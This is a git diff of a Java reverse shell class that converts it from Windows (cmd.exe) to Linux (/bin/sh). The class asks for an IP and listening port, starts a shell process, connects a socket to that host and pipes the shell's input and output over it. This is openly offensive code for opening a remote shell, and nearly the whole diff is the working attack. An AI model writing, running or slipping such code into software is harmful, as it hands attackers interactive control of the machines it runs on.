@@ -1,4 +1,4 @@
-package apps;
+package apps.ReverseShell;
 
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -7,12 +7,12 @@ import java.util.Scanner;
 
 import controller.Controller;
 
-public class WindowsReverseShell {
+public class LinuxReverseShell {
 
-	public static void WindowsReverseShell(int port, String ip) throws Exception {
+	public static void LinuxReverseShell(int port, String ip) throws Exception {
 	    String host=ip;
 	    //int port=9999;
-	    String cmd="cmd.exe";
+	    String cmd="/bin/sh";
 	    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
 	    Socket s=new Socket(host,port);
 	    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
@@ -44,7 +44,7 @@ public class WindowsReverseShell {
 	String ip = inputScanner.nextLine();
 	System.out.println("Please input the listening port");
 	int port = Integer.parseInt(inputScanner.nextLine());	//int x = Integer.parseInt(input);
-	WindowsReverseShell(port, ip);
+	LinuxReverseShell(port, ip);
 	}
 }
 
